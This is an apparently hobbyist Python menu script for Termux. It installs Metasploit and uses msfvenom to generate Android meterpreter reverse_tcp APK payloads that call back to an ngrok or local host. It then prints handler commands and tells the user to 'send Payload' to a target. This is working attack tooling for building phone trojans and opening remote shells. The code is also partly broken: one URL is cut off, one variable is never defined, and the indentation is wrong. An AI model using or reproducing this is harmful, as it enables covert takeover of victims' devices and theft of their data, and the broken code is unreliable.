import os, sys, time








 





 print('\033[1;36m')
 logo = """

           ▄▄                            ▄▄▄▄                                ▄▄
           ██                            ▀▀██                                ██
           ██▄███▄    ▄█████▄  ▀██  ███    ██       ▄████▄    ▄█████▄   ▄███▄██
           ██▀  ▀██   ▀ ▄▄▄██   ██▄ ██     ██      ██▀  ▀██   ▀ ▄▄▄██  ██▀  ▀██
           ██    ██  ▄██▀▀▀██    ████▀     ██      ██    ██  ▄██▀▀▀██  ██    ██
           ███▄▄██▀  ██▄▄▄███     ███      ██▄▄▄   ▀██▄▄██▀  ██▄▄▄███  ▀██▄▄███
           ▀▀ ▀▀▀     ▀▀▀▀ ▀▀     ██        ▀▀▀▀     ▀▀▀▀     ▀▀▀▀ ▀▀    ▀▀▀ ▀▀
 """





 print(logo)

 print('\033[1;34m{1} \033[1;35mInstall Metsploit')
 print('\033[1;34m{2} \033[1;35mPayload Android OutSide\033[1;31mBy Ngrok')
 print('\033[1;34m{3} \033[1;35mPayload Android \033[1;31mBy IP')
 print('\033[1;34m{4} \033[1;35mFind me in facebook')
 print('\033[1;34m{0} \033[1;31mExit')

 choose = input('\033[1;34m{?} \033[1;36mChoose > \033[1;34m')

 if choose == '1':
     os.system('clear')
     print(logo)
     os.system(
         'pkg update && pkg upgrade && pkg install git curl wget nmap -y && curl -LO raw.githubusercontent.com/Hax4us/Metasploit_termux/maste>
     print('\033[1;31mPlease Wait')
     os.system('clear')
     print('Metasploit install successfully')
     os.system('msfconsole')


 elif choose == '2':
     os.system('clear')
     print(logo)
     print('\033[1;36mPlease Run Ngrok Tool And Enter Port Here\n')

     port = input('\033[1;33mENTER PORT NGROK After tcp.ngrok.io:\033[1;31mxxxxxx\033[1;33m>\033[1;31m')
     host = input('ENTER First Number HOST NGROK : ')
     name = input('\033[1;33mENTER NAME FOR PAYLOAD   >\033[1;31m')
     print('\033[1;31mPlease Wait')
     os.system(f'msfvenom -p android/meterpreter/reverse_tcp LHOST={host}.tcp.ngrok.io LPORT={port} R> /sdcard/{name}.apk')
     os.system('clear')
     print(f'\033[1;33mNow You Can Find Payload in /sdcard/{name}.apk\n')
     print('\033[1;31mNow send Payload And Back Here And Type \n\033[1;31m')
     print('\033[1;37m$ \033[1;32muse exploit/multi/handler')
     print('\033[1;37m$ \033[1;32mset payload android/meterpreter/reverse_tcp')
     print('\033[1;37m$ \033[1;32mset LHOST localhost')
     print(f'\033[1;37m$ \033[1;32mset LPORT After localhost:\033[1;31mxxxx')
     print('\033[1;37m$ \033[1;32mexploit\n')
     os.system(f'msfconsole')

 elif choose == '3':
     os.system('clear')
     print(logo)
     port = input('\033[1;33mENTER ANY PORT   >\033[1;31m')
     name = input('\033[1;33mENTER NAME FOR PAYLOAD  >\033[1;31m')
     print('\033[1;31mPlease Wait')
     os.system(f'msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} R> /sdcard/{name}.apk')
     os.system('clear')
     print(f'\033[1;33mNow You Can Find Payload in /sdcard/{name}.apk\n')
     print('\033[1;31mNow send Payload And Back Here And Type \n\033[1;31m')
     print('\033[1;37m$ \033[1;32muse exploit/multi/handler')
     print('\033[1;37m$ \033[1;32mset payload android/meterpreter/reverse_tcp')
     print(f'\033[1;37m$ \033[1;32mset LHOST localhost')
     print(f'\033[1;37m$ \033[1;32mset LPORT {port}')
     print('\033[1;37m$ \033[1;32mexploit\n')
     os.system(f'msfconsole')




 elif choose == '4':
     os.system('clear')
     print(logo)
     os.system('xdg-open https://www.facebook.com/clavier.azerty.999')

 elif choose == '0':
     os.system('clear')
     print(logo)
     os.system('xdg-open https://www.facebook.com/clavier.azerty.999')
     os.system('exit')
 else:
     print('\033[1;37mPlease Choose Only 1 Or 2 Or 3 For \033[1;31mExit')
